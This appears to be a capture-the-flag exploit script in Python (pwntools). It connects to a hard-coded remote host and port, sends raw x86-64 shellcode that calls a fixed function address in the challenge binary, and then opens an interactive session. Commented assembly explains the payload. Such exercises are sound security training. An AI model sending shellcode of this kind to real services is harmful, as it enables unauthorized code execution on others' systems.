from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = "109.233.56.90", 11650

io = remote(HOST, PORT)



#io.recvuntil(b"5h3llC0d3, dud3zz?")


#payload = asm(shellcraft.amd64.linux.sh())
sc = b"\x50\xbf\xbe\xba\xfe\xca\xbe\x80\x00\x00\x00\x8d\x56\xff\x31\xc9\x6a\xff\x41\x58\xb8\xb0\x06\x40\x00\xff\xd0"
io.send(sc.ljust(0x400, b"\x00"))
io.interactive()
#
#
# BIT 64
#
# and rsp, 0xFFFFFFFFFFFFFFF0
# mov rdi, 0xCOFEBABE
# mov rsi, 128
# mov rdx, 127
# mov rcx, 0
# mov r8, -1
# mov rax, 0x4006B0
#
# call rax
